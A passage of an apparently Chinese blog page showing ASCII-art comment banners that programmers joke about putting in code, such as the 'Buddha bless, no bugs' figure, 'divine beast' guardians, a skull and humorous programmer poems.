class=\"line\">|  +------------------------------------------------------------------+  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  |                                                                  |  |</span><br><span class=\"line\">|  +------------------------------------------------------------------+  |</span><br><span class=\"line\">|        f0    f1    f2    f3    f4    f5    f6    f7    f8    f9        |</span><br><span class=\"line\">+------------------------------------------------------------------------+</span><br><span class=\"line\">|                                                                        |</span><br><span class=\"line\">|  [f0]  [f1]  [f2]  [f3]  [f4]  [f5]  [f6]  [f7]  [f8]  [f9]   [On&#x2F;Off] |</span><br><span class=\"line\">|                                                                        |</span><br><span class=\"line\">|     [Q]  [W]  [E]  [R]  [T]  [Y]  [U]  [I]  [O]  [P]   [&lt;] [^] [v] [^] |</span><br><span class=\"line\">|                                                                        |</span><br><span class=\"line\">|     [Q]  [W]  [E]  [R]  [T]  [Y]  [U]  [I]  [O]  [P]   [7] [8] [9] [&#x2F;] |</span><br><span class=\"line\">|                                                                        |</span><br><span class=\"line\">|       [A]  [S]  [D]  [F]  [G]  [H]  [J]  [K]  [L]      [4] [5] [6] [*] |</span><br><span class=\"line\">|                                                                        |</span><br><span class=\"line\">|  [CTRL]  [Z]  [X]  [C]  [V]  [B]  [N]  [M]  [ ENTER ]  [1] [2] [3] [-] |</span><br><span class=\"line\">|                                                                        |</span><br><span class=\"line\">|  [SHIFT]  [ALT]   [    space    ]   [,]  [.]  [SHIFT]  [0] [.] [&#x3D;] [+] |</span><br><span class=\"line\">|                                                                        |</span><br><span class=\"line\">+------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>**佛祖保佑，永无BUG</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;                            _ooOoo_    </span><br><span class=\"line\">&#x2F;&#x2F;                           o8888888o    </span><br><span class=\"line\">&#x2F;&#x2F;                           88&quot; . &quot;88    </span><br><span class=\"line\">&#x2F;&#x2F;                           (| -_- |)    </span><br><span class=\"line\">&#x2F;&#x2F;                            O\\ &#x3D; &#x2F;O    </span><br><span class=\"line\">&#x2F;&#x2F;                        ____&#x2F;&#96;---&#39;\\____    </span><br><span class=\"line\">&#x2F;&#x2F;                      .   &#39; \\\\| |&#x2F;&#x2F; &#96;.    </span><br><span class=\"line\">&#x2F;&#x2F;                       &#x2F; \\\\||| : |||&#x2F;&#x2F; \\    </span><br><span class=\"line\">&#x2F;&#x2F;                     &#x2F; _||||| -:- |||||- \\    </span><br><span class=\"line\">&#x2F;&#x2F;                       | | \\\\\\ - &#x2F;&#x2F;&#x2F; | |    </span><br><span class=\"line\">&#x2F;&#x2F;                     | \\_| &#39;&#39;\\---&#x2F;&#39;&#39; | |    </span><br><span class=\"line\">&#x2F;&#x2F;                      \\ .-\\__ &#96;-&#96; ___&#x2F;-. &#x2F;    </span><br><span class=\"line\">&#x2F;&#x2F;                   ___&#96;. .&#39; &#x2F;--.--\\ &#96;. . __    </span><br><span class=\"line\">&#x2F;&#x2F;                .&quot;&quot; &#39;&lt; &#96;.___\\_&lt;|&gt;_&#x2F;___.&#39; &gt;&#39;&quot;&quot;.    </span><br><span class=\"line\">&#x2F;&#x2F;               | | : &#96;- \\&#96;.;&#96;\\ _ &#x2F;&#96;;.&#96;&#x2F; - &#96; : | |    </span><br><span class=\"line\">&#x2F;&#x2F;                 \\ \\ &#96;-. \\_ __\\ &#x2F;__ _&#x2F; .-&#96; &#x2F; &#x2F;    </span><br><span class=\"line\">&#x2F;&#x2F;         &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#96;-.____&#96;-.___\\_____&#x2F;___.-&#96;____.-&#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;    </span><br><span class=\"line\">&#x2F;&#x2F;                            &#96;&#x3D;---&#x3D;&#39;    </span><br><span class=\"line\">&#x2F;&#x2F;    </span><br><span class=\"line\">&#x2F;&#x2F;         .............................................    </span><br><span class=\"line\">&#x2F;&#x2F;                  佛祖保佑             永无BUG</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>**神兽护体，永无BUG</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; ┏┓　　　┏┓</span><br><span class=\"line\">&#x2F;&#x2F; ┏┛┻━━━┛┻┓</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　　　　　┃ 　</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　━　　　┃</span><br><span class=\"line\">&#x2F;&#x2F; ┃　┳┛　┗┳　┃</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　　　　　┃</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　┻　　　┃</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　　　　　┃</span><br><span class=\"line\">&#x2F;&#x2F; ┗━┓　　　┏━┛</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　┃ Code is far away from bug with the animal protecting　　　　　　　　</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　┃ 神兽保护，永无BUG！</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　┗━━━┓</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　　　　　┣┓</span><br><span class=\"line\">&#x2F;&#x2F; ┃　　　　　　　┏┛</span><br><span class=\"line\">&#x2F;&#x2F; ┗┓┓┏━┳┓┏┛</span><br><span class=\"line\">&#x2F;&#x2F; ┃┫┫　┃┫┫</span><br><span class=\"line\">&#x2F;&#x2F; ┗┻┛　┗┻┛</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> *　　　　　　　　┏┓　　　┏┓+ +</span><br><span class=\"line\"> *　　　　　　　┏┛┻━━━┛┻┓ + +</span><br><span class=\"line\"> *　　　　　　　┃　　　　　　　┃ 　</span><br><span class=\"line\"> *　　　　　　　┃　　　━　　　┃ ++ + + +</span><br><span class=\"line\"> *　　　　　　 ████━████ ┃+</span><br><span class=\"line\"> *　　　　　　　┃　　　　　　　┃ +</span><br><span class=\"line\"> *　　　　　　　┃　　　┻　　　┃</span><br><span class=\"line\"> *　　　　　　　┃　　　　　　　┃ + +</span><br><span class=\"line\"> *　　　　　　　┗━┓　　　┏━┛</span><br><span class=\"line\"> *　　　　　　　　　┃　　　┃　　　　　　　　　　　</span><br><span class=\"line\"> *　　　　　　　　　┃　　　┃ + + + +</span><br><span class=\"line\"> *　　　　　　　　　┃　　　┃　Code is far away from bug with the animal protecting　　　　　　　</span><br><span class=\"line\"> *　　　　　　　　　┃　　　┃ + 神兽保佑,永无bug　　</span><br><span class=\"line\"> *　　　　　　　　　┃　　　┃</span><br><span class=\"line\"> *　　　　　　　　　┃　　　┃　　+　　　　　　　　　</span><br><span class=\"line\"> *　　　　　　　　　┃　 　　┗━━━┓ + +</span><br><span class=\"line\"> *　　　　　　　　　┃ 　　　　　　　┣┓</span><br><span class=\"line\"> *　　　　　　　　　┃ 　　　　　　　┏┛</span><br><span class=\"line\"> *　　　　　　　　　┗┓┓┏━┳┓┏┛ + + + +</span><br><span class=\"line\"> *　　　　　　　　　　┃┫┫　┃┫┫</span><br><span class=\"line\"> *　　　　　　　　　　┗┻┛　┗┻┛+ + + +</span><br><span class=\"line\"> *&#x2F;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><strong>程序员打油诗</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> *                      江城子 . 程序员之歌</span><br><span class=\"line\"> *</span><br><span class=\"line\"> *                  十年生死两茫茫，写程序，到天亮。</span><br><span class=\"line\"> *                      千行代码，Bug何处藏。</span><br><span class=\"line\"> *                  纵使上线又怎样，朝令改，夕断肠。</span><br><span class=\"line\"> *</span><br><span class=\"line\"> *                  领导每天新想法，天天改，日日忙。</span><br><span class=\"line\"> *                      相顾无言，惟有泪千行。</span><br><span class=\"line\"> *                  每晚灯火阑珊处，夜难寐，加班狂。</span><br><span class=\"line\">*&#x2F;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> *          写字楼里写字间，写字间里程序员；</span><br><span class=\"line\"> *          程序人员写程序，又拿程序换酒钱。</span><br><span class=\"line\"> *          酒醒只在网上坐，酒醉还来网下眠；</span><br><span class=\"line\"> *          酒醉酒醒日复日，网上网下年复年。</span><br><span class=\"line\"> *          但愿老死电脑间，不愿鞠躬老板前；</span><br><span class=\"line\"> *          奔驰宝马贵者趣，公交自行程序员。</span><br><span class=\"line\"> *          别人笑我忒疯癫，我笑自己命太贱；</span><br><span class=\"line\"> *          不见满街漂亮妹，哪个归得程序员？</span><br><span class=\"line\"> *&#x2F;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><strong>单身狗</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!--</span><br><span class=\"line\">                       ::</span><br><span class=\"line\">                      :;J7, :,                        ::;7:</span><br><span class=\"line\">                      ,ivYi, ,                       ;LLLFS:</span><br><span class=\"line\">                      :iv7Yi                       :7ri;j5PL</span><br><span class=\"line\">                     ,:ivYLvr                    ,ivrrirrY2X,</span><br><span class=\"line\">                     :;r@Wwz.7r:                :ivu@kexianli.</span><br><span class=\"line\">                    :iL7::,:::iiirii:ii;::::,,irvF7rvvLujL7ur</span><br><span class=\"line\">                   ri::,:,::i:iiiiiii:i:irrv177JX7rYXqZEkvv17</span><br><span class=\"line\">                ;i:, , ::::iirrririi:i:::iiir2XXvii;L8OGJr71i</span><br><span class=\"line\">              :,, ,,:   ,::ir@mingyi.irii:i:::j1jri7ZBOS7ivv,</span><br><span class=\"line\">                 ,::,    ::rv77iiiriii:iii:i::,rvLq@huhao.Li</span><br><span class=\"line\">             ,,      ,, ,:ir7ir::,:::i;ir:::i:i::rSGGYri712:</span><br><span class=\"line\">           :::  ,v7r:: ::rrv77:, ,, ,:i7rrii:::::, ir7ri7Lri</span><br><span class=\"line\">          ,     2OBBOi,iiir;r::        ,irriiii::,, ,iv7Luur:</span><br><span class=\"line\">        ,,     i78MBBi,:,:::,:,  :7FSL: ,iriii:::i::,,:rLqXv::</span><br><span class=\"line\">        :      iuMMP: :,:::,:ii;2GY7OBB0viiii:i:iii:i:::iJqL;::</span><br><span class=\"line\">       ,     ::::i   ,,,,, ::LuBBu BBBBBErii:i:i:i:i:i:i:r77ii</span><br><span class=\"line\">      ,       :       , ,,:::rruBZ1MBBqi, :,,,:::,::::::iiriri:</span><br><span class=\"line\">     ,               ,,,,::::i:  @arqiao.       ,:,, ,:::ii;i7:</span><br><span class=\"line\">    :,       rjujLYLi   ,,:::::,:::::::::,,   ,:i,:,,,,,::i:iii</span><br><span class=\"line\">    ::      BBBBBBBBB0,    ,,::: , ,:::::: ,      ,,,, ,,:::::::</span><br><span class=\"line\">    i,  ,  ,8BMMBBBBBBi     ,,:,,     ,,, , ,   , , , :,::ii::i::</span><br><span class=\"line\">    :      iZMOMOMBBM2::::::::::,,,,     ,,,,,,:,,,::::i:irr:i:::,</span><br><span class=\"line\">    i   ,,:;u0MBMOG1L:::i::::::  ,,,::,   ,,, ::::::i:i:iirii:i:i:</span><br><span class=\"line\">    :    ,iuUuuXUkFu7i:iii:i:::, :,:,: ::::::::i:i:::::iirr7iiri::</span><br><span class=\"line\">    :     :rk@Yizero.i:::::, ,:ii:::::::i:::::i::,::::iirrriiiri::,</span><br><span class=\"line\">     :      5BMBBBBBBSr:,::rv2kuii:::iii::,:i:,, , ,,:,:i@petermu.,</span><br><span class=\"line\">          , :r50EZ8MBBBBGOBBBZP7::::i::,:::::,: :,:,::i;rrririiii::</span><br><span class=\"line\">              :jujYY7LS0ujJL7r::,::i::,::::::::::::::iirirrrrrrr:ii:</span><br><span class=\"line\">           ,:  :@kevensun.:,:,,,::::i:i:::::,,::::::iir;ii;7v77;ii;i,</span><br><span class=\"line\">           ,,,     ,,:,::::::i:iiiii:i::::,, ::::iiiir@xingjief.r;7:i,</span><br><span class=\"line\">        , , ,,,:,,::::::::iiiiiiiiii:,:,:::::::::iiir;ri7vL77rrirri::</span><br><span class=\"line\">         :,, , ::::::::i:::i:::i:i::,,,,,:,::i:i:::iir;@Secbone.ii:::</span><br><span class=\"line\"></span><br><span class=\"line\">--&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><strong>骷髅头</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> **************************************************************</span><br><span class=\"line\"> *                                                            *</span><br><span class=\"line\"> *   .&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-.       *</span><br><span class=\"line\"> *    |                     ______                     |      *</span><br><span class=\"line\"> *    |                  .-&quot;      &quot;-.                  |      *</span><br><span class=\"line\"> *    |                 &#x2F;            \\                 |      *</span><br><span class=\"line\"> *    |     _          |              |          _     |      *</span><br><span class=\"line\"> *    |    ( \\         |,  .-.  .-.  ,|         &#x2F; )    |      *</span><br><span class=\"line\"> *    |     &gt; &quot;&#x3D;._     | )(__&#x2F;  \\__)( |     _.&#x3D;&quot; &lt;     |      *</span><br><span class=\"line\"> *    |    (_&#x2F;&quot;&#x3D;._&quot;&#x3D;._ |&#x2F;     &#x2F;\\     \\| _.&#x3D;&quot;_.&#x3D;&quot;\\_)    |      *</span><br><span class=\"line\"> *    |           &quot;&#x3D;._&quot;(_     ^^     _)&quot;_.&#x3D;&quot;           |      *</span><br><span class=\"line\"> *    |               &quot;&#x3D;\\__|IIIIII|__&#x2F;&#x3D;&quot;               |      *</span><br><span class=\"line\"> *    |              _.&#x3D;&quot;| \\IIIIII&#x2F; |&quot;&#x3D;._              |      *</span><br><span class=\"line\"> *    |    _     _.&#x3D;&quot;_.&#x3D;&quot;\\          &#x2F;&quot;&#x3D;._&quot;&#x3D;._     _    |      *</span><br><span class=\"line\"> *    |   ( \\_.&#x3D;&quot;_.&#x3D;&quot;     &#96;--------&#96;     &quot;&#x3D;._&quot;&#x3D;._&#x2F; )   |      *</span><br><span class=\"line\"> *    |    &gt; _.&#x3D;&quot;                            &quot;&#x3D;._ &lt;    |      *</span><br><span class=\"line\"> *    |   (_&#x2F;                                    \\_)   |      *</span><br><span class=\"line\"> *    |                                                |      *</span><br><span class=\"line\"> *    &#39;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;&#39;      *</span><br><span class=\"line\"> *                                                            *</span><br><span class=\"line\"> *           LASCIATE OGNI SPERANZA, VOI CH&#39;ENTRATE           *</span><br><span class=\"line\"> **************************************************************</span><br><span class=\"line\"> *&#x2F;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><strong>顶</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> * 頂頂頂頂頂頂頂頂頂　頂頂頂頂頂頂頂頂頂</span><br><span class=\"line\"> * 頂頂頂頂頂頂頂　　　　　頂頂　　　　　</span><br><span class=\"line\"> * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂</span><br><span class=\"line\"> * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂</span><br><span class=\"line\"> * 　　　頂頂　　　頂頂　　　　　　　頂頂</span><br><span class=\"line\"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class=\"line\"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class=\"line\"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class=\"line\"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class=\"line\"> * 　　　頂頂　　　　　　　頂頂頂　</span><br><span class=\"line\"> * 　　　頂頂　　　　　　頂頂　頂頂　頂頂</span><br><span class=\"line\"> * 　頂頂頂頂　　　頂頂頂頂頂　頂頂頂頂頂</span><br><span class=\"line\"> * 　頂頂頂頂　　　頂頂頂頂　　　頂頂頂頂</span><br><span class=\"line\"> *&#x2F;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>**BUG泛滥，我已瘫痪</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> * _ooOoo_</span><br><span class=\"line\"> * o8888888o</span><br><span class=\"line\"> * 88&quot; . &quot;88</span><br><span class=\"line\"> * (| -_- |)</span><br><span class=\"line\"> *  O\\ &#x3D; &#x2F;O</span><br><span class=\"line\"> * ___&#x2F;&#96;---&#39;\\____</span><br><span class=\"line\"> * .   &#39; \\\\| |&#x2F;&#x2F; &#96;.</span><br><span class=\"line\"> * &#x2F; \\\\||| : |||&#x2F;&#x2F; \\</span><br><span class=\"line\"> * &#x2F; _||||| -:- |||||- \\</span><br><span class=\"line\"> * | | \\\\\\ - &#x2F;&#x2F;&#x2F; | |</span><br><span class=\"line\"> * | \\_| &#39;&#39;\\---&#x2F;&#39;&#39; | |</span><br><span class=\"line\"> * \\ .-\\__ &#96;-&#96; ___&#x2F;-. &#x2F;</span><br><span class=\"line\"> * ___&#96;. .&#39; &#x2F;--.--\\ &#96;. . __</span><br><span class=\"line\"> * .&quot;&quot; &#39;&lt; &#96;.___\\_&lt;|&gt;_&#x2F;___.&#39; &gt;&#39;&quot;&quot;.</span><br><span class=\"line\"> * | | : &#96;- \\&#96;.;&#96;\\ _ &#x2F;&#96;;.&#96;&#x2F; - &#96; : | |</span><br><span class=\"line\"> * \\ \\ &#96;-. \\_ __\\ &#x2F;__ _&#x2F; .-&#96; &#x2F; &#x2F;</span><br><span class=\"line\"> * &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#96;-.____&#96;-.___\\_____&#x2F;___.-&#96;____.-&#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class=\"line\"> * &#96;&#x3D;---&#x3D;&#39;</span><br><span class=\"line\"> * .............................................</span><br><span class=\"line\"> * 佛曰：bug泛滥，我已瘫痪！</span><br><span class=\"line\"> *&#x2F;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><strong>啪</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> *                                         ,s555SB@@&amp;                          </span><br><span class=\"line\"> *                                      :9H####@@@@@Xi                        </span><br><span class=\"line\"> *                                     1@@@@@@@@@@@@@@8                       </span><br><span class=\"line\"> *                                   ,8@@@@@@@@@B@@@@@@8                      </span><br><span class=\"line\"> *                                  :B@@@@X3hi8Bs;B@@@@@Ah,                   </span><br><span class=\"line\"> *             ,8i                  r@@@B:     1S ,M@@@@@@#8;                 </span><br><span class=\"line\"> *            1AB35.i:               X@@8 .   SGhr ,A@@@@@@@@S                </span><br><span class=\"line\"> *            1@h31MX8                18Hhh3i .i3r ,A@@@@@@@@@5               </span><br><span class=\"line\"> *            ;@&amp;i,58r5                 rGSS:     :B@@@@@@@@@@A               </span><br><span class=\"line\"> *             1#i  . 9i                 hX.  .: .5@@@@@@@@@@@1               </span><br><span class=\"line\"> *              sG1,  ,G53s.              9#Xi;hS5 3B@@@@@@@B1                </span><br><span class=\"line\"> *               .h8h.,A@@@MXSs,           #@H1:    3ssSSX@1                  </span><br><span class=\"line\"> *               s ,@@@@@@@@@@@@Xhi,       r#@@X1s9M8    .GA981               </span><br><span class=\"line\"> *               ,. rS8H#@@@@@@@@@@#HG51;.  .h31i;9@r    .8@@@@BS;i;          </span><br><span class=\"line\"> *                .19AXXXAB@@@@@@@@@@@@@@#MHXG893hrX#XGGXM@@@@@@@@@@MS        </span><br><span class=\"line\"> *                s@@MM@@@hsX#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&amp;,      </span><br><span class=\"line\"> *              :GB@#3G@@Brs ,1GM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B,     </span><br><span class=\"line\"> *            .hM@@@#@@#MX 51  r;iSGAM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8     </span><br><span class=\"line\"> *          :3B@@@@@@@@@@@&amp;9@h :Gs   .;sSXH@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:    </span><br><span class=\"line\"> *      s&amp;HA#@@@@@@@@@@@@@@M89A;.8S.       ,r3@@@@@@@@@@@@@@@@@@@@@@@@@@@r    </span><br><span class=\"line\"> *   ,13B@@@@@@@@@@@@@@@@@@@5 5B3 ;.         ;@@@@@@@@@@@@@@@@@@@@@@@@@@@i    </span><br><span class=\"line\"> *  5#@@#&amp;@@@@@@@@@@@@@@@@@@9  .39:          ;@@@@@@@@@@@@@@@@@@@@@@@@@@@;    </span><br><span class=\"line\"> *  9@@@X:MM@@@@@@@@@@@@@@@#;    ;31.         H@@@@@@@@@@@@@@@@@@@@@@@@@@:    </span><br><span class=\"line\"> *   SH#@B9.rM@@@@@@@@@@@@@B       :.         3@@@@@@@@@@@@@@@@@@@@@@@@@@5    </span><br><span class=\"line\"> *     ,:.   9@@@@@@@@@@@#HB5                 .M@@@@@@@@@@@@@@@@@@@@@@@@@B    </span><br><span class=\"line\"> *           ,ssirhSM@&amp;1;i19911i,.             s@@@@@@@@@@@@@@@@@@@@@@@@@@S   </span><br><span class=\"line\"> *              ,,,rHAri1h1rh&amp;@#353Sh:          8@@@@@@@@@@@@@@@@@@@@@@@@@#:  </span><br><span class=\"line\"> *            .A3hH@#5S553&amp;@@#h   i:i9S          #@@@@@@@@@@@@@@@@@@@@@@@@@A. </span><br><span class=\"line\"> *</span><br><span class=\"line\"> *</span><br><span class=\"line\"> *   </span><br><span class=\"line\"> *&#x2F;</span><br></pre></td></tr></table></figure>\n<p><strong><a href=\"http://www.asciiworld.com/\">Click Here For 